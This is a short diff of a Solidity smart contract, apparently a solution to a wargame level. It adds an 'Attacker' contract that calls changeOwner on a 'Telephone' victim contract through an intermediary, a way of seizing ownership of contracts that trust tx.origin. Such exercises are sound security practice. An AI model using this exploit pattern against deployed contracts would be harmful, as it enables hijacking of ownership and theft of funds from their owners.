@@ -1,16 +1,18 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.6.0;
 
-import '@openzeppelin/contracts/math/SafeMath.sol';
-// import './coinflip.sol';
+import './telephone.sol';
 
-// contract Attacker {
-//     CoinFlip coinflipContract; //Contractname contractvariable
+contract Attacker {
+    Telephone victimContract; //Contractname contractvariable
 
 // import a contract
-//   constructor(address coinFlipContractAddress) public {
-//         coinflipContract = CoinFlip(coinFlipContractAddress);
-//     }
+  constructor(address telephoneContractAddress) public {
+        victimContract = Telephone(telephoneContractAddress);
+    }
 
-  
-// }
+  function sendAttackerMessage(address _attackerAddress) external{
+    victimContract.changeOwner(_attackerAddress);
+  }
+
+}
